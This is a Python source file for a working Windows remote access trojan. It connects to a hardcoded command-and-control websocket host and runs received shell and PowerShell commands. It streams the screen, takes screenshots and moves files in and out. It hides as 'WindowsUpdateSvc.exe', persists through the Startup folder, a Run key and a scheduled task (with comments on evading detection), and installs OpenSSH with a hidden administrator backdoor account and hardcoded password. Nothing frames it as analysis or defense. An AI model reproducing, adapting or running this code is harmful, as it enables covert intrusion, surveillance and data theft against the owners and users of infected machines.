import os
import sys
import json
import socket
import subprocess
import base64
import time
import platform
import threading
import uuid
import websocket
import pyautogui
import cv2
import numpy as np
import shutil
from PIL import ImageGrab

# --- CONFIGURATION ---
C2_URL = "wss://textgame-9-c2.fly.dev/shell"
APP_NAME = "WindowsUpdateSvc.exe"
REG_NAME = "WindowsUpdateSvc"
# ---------------------

CURRENT_CWD = os.getcwd()

try:
    MAC = uuid.getnode()
    HARDWARE_ID = f"{MAC:012x}"
except Exception:
    HARDWARE_ID = str(uuid.uuid4())[:12]

SESSION_ID = f"rs-{socket.gethostname()}-{HARDWARE_ID}"

STREAM_EVENT = threading.Event()
CMD_LOCK = threading.Lock()

def send(ws, obj):
    try:
        ws.send(json.dumps(obj))
    except Exception:
        pass

def fingerprint():
    return {
        "os": sys.platform,
        "platform": "win32" if sys.platform == "win32" else sys.platform,
        "hostname": socket.gethostname(),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
        "cwd": os.getcwd(),
        "hardware_id": HARDWARE_ID,
        "device_id": HARDWARE_ID,
        "ext": False
    }

def stream_screen(ws):
    STREAM_EVENT.clear()
    try:
        while not STREAM_EVENT.is_set():
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            b64 = base64.b64encode(buffer).decode('utf-8')
            
            send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
            time.sleep(0.2) 
    except Exception:
        pass

def run_cmd(ws, cmd):
    global CURRENT_CWD
    cmd = cmd.strip()

    if cmd.lower().startswith("cd "):
        target = cmd[3:].strip().strip('"').strip("'")
        try:
            if not os.path.isabs(target):
                new_path = os.path.join(CURRENT_CWD, target)
            else:
                new_path = target
                
            new_path = os.path.abspath(new_path)
            
            if os.path.isdir(new_path):
                CURRENT_CWD = new_path
                send(ws, {"t": "reply", "data": f"Changed directory to: {CURRENT_CWD}\n"})
            else:
                send(ws, {"t": "reply", "data": f"cd: no such directory: {target}\n"})
        except Exception as e:
            send(ws, {"t": "reply", "data": f"cd failed: {e}\n"})
        return

    try:
        if 'powershell' in cmd:
            proc = subprocess.Popen(
                ["powershell.exe", "-WindowStyle", "Hidden"] + cmd.split()[1:], 
                cwd=CURRENT_CWD,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT
            )
        else:
            proc = subprocess.Popen(
                cmd, 
                shell=True, 
                cwd=CURRENT_CWD,
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT
            )
            
        out, _ = proc.communicate(timeout=30)
        text = out.decode("utf-8", errors="ignore")
        if not text:
            text = f"[exit {proc.returncode}, no output]"
            
        send(ws, {"t": "reply", "data": f"{text}\n{CURRENT_CWD}> "})
        
    except subprocess.TimeoutExpired:
        proc.kill()
        send(ws, {"t": "reply", "data": "[timeout 30s]\n"})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[exec error] {e}\n"})

def do_screenshot(ws):
    try:
        snapshot = ImageGrab.grab()
        file = os.environ.get("appdata", os.getcwd()) + '\\' + "IMage.jpg"
        snapshot.save(file)
        with open(file, "rb") as f:
            b64 = base64.b64encode(f.read()).decode('utf-8')
            send(ws, {"t": "reply", "data": f"[SCREENSHOT] {b64}"})
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[-] Screenshot error: {e}\n"})

def do_upload(ws, path, b64_data):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64_data))
        send(ws, {"t": "upload_ack", "path": path, "ok": True})
        send(ws, {"t": "reply", "data": f"[+] Upload complete: {path}\n"})
    except Exception as e:
        send(ws, {"t": "upload_ack", "path": path, "ok": False, "err": str(e)})
        send(ws, {"t": "reply", "data": f"[-] Upload failed: {e}\n"})

def do_download(ws, path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        send(ws, {
            "t": "download",
            "path": path,
            "data": base64.b64encode(data).decode(),
            "size": len(data),
        })
    except Exception as e:
        send(ws, {"t": "reply", "data": f"[-] Download failed: {e}\n"})

def setup_ssh():
    """Installs and enables OpenSSH Server, creates a backdoor user."""
    if sys.platform != 'win32':
        return

    try:
        check_ssh = subprocess.run(
            'powershell -NoProfile -WindowStyle Hidden -Command "(Get-Service sshd -ErrorAction SilentlyContinue).Status"',
            shell=True, capture_output=True, text=True
        )
        if "Running" in check_ssh.stdout:
            return

        ps_install = (
            'powershell -NoProfile -WindowStyle Hidden -Command "'
            'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"'
        )
        subprocess.run(ps_install, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        ps_service = (
            'powershell -NoProfile -WindowStyle Hidden -Command "'
            'Start-Service sshd; '
            'Set-Service -Name sshd -StartupType Automatic; '
            'New-NetFirewallRule -Name sshd -DisplayName \'OpenSSH Server\' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue"'
        )
        subprocess.run(ps_service, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        ps_user = (
            'powershell -NoProfile -WindowStyle Hidden -Command "'
            '$u = \'svc_backup\'; $p = ConvertTo-SecureString \'P@ssw0rd2026!\' -AsPlainText -Force; '
            'New-LocalUser -Name $u -Password $p -FullName \'Windows Service\' -Description \'System Service Account\' -ErrorAction SilentlyContinue; '
            'Add-LocalGroupMember -Group \'Administrators\' -Member $u -ErrorAction SilentlyContinue; '
            'Set-ItemProperty -Path \'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\' -Name $u -Value 0 -ErrorAction SilentlyContinue"'
        )
        subprocess.run(ps_user, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    except Exception:
        pass

def setup_persistence():
    """Copies the executable to the Roaming Startup folder and sets up persistence."""
    if sys.platform != 'win32':
        return

    # --- SSH SETUP ---
    threading.Thread(target=setup_ssh, daemon=True).start()

    # --- PERSISTENCE ---
    roaming = os.getenv("APPDATA")
    if not roaming:
        return

    startup_dir = os.path.join(roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    target_exe = os.path.join(startup_dir, APP_NAME)
    current_exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]

    if os.path.abspath(current_exe).lower() == os.path.abspath(target_exe).lower():
        return

    try:
        os.makedirs(startup_dir, exist_ok=True)
        shutil.copy2(current_exe, target_exe)

        # 1. Registry via PowerShell (avoids cmd.exe signature)
        ps_reg = (
            'powershell.exe -NoProfile -WindowStyle Hidden -Command "'
            'New-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' '
            '-Name \'WindowsUpdateSvc\' -Value \'{0}\' -PropertyType String -Force"'
        ).format(target_exe)
        subprocess.run(ps_reg, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 2. Scheduled Task via PowerShell Cmdlets (WMI), not schtasks.exe
        ps_task = (
            'powershell.exe -NoProfile -WindowStyle Hidden -Command "'
            '$A = New-ScheduledTaskAction -Execute \'{0}\'; '
            '$T = New-ScheduledTaskTrigger -AtLogOn; '
            '$P = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive; '
            'Register-ScheduledTask -TaskName \'WindowsUpdateSvc\' -Action $A -Trigger $T -Principal $P -Force"'
        ).format(target_exe)
        subprocess.run(ps_task, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 3. Start the new copy silently
        subprocess.Popen([target_exe], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)

    except Exception:
        pass

def main():
    # Setup persistence and SSH before connecting
    setup_persistence()

    while True:
        try:
            ws = websocket.create_connection(C2_URL, timeout=30)
            send(ws, {"t": "hello", "id": SESSION_ID, "fp": fingerprint()})

            while True:
                msg = ws.recv()
                if not msg: break
                try:
                    frame = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                    
                t = frame.get("t")
                if t == "cmd":
                    cmd = frame.get("cmd", "").strip()
                    
                    if cmd == "stopstream":
                        STREAM_EVENT.set()
                    elif cmd == "stream":
                        if not STREAM_EVENT.is_set():
                            STREAM_EVENT.set() 
                            time.sleep(0.2)
                        threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
                    elif cmd == "screenshot":
                        threading.Thread(target=do_screenshot, args=(ws,), daemon=True).start()
                    else:
                        def threaded_cmd():
                            if CMD_LOCK.acquire(blocking=False):
                                try:
                                    run_cmd(ws, cmd)
                                finally:
                                    CMD_LOCK.release()
                            else:
                                send(ws, {"t": "reply", "data": "[-] Command busy, try again.\n"})
                        threading.Thread(target=threaded_cmd, daemon=True).start()
                        
                elif t == "upload":
                    threading.Thread(target=do_upload, args=(ws, frame.get("path"), frame.get("data")), daemon=True).start()
                elif t == "download":
                    threading.Thread(target=do_download, args=(ws, frame.get("path")), daemon=True).start()
                    
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()
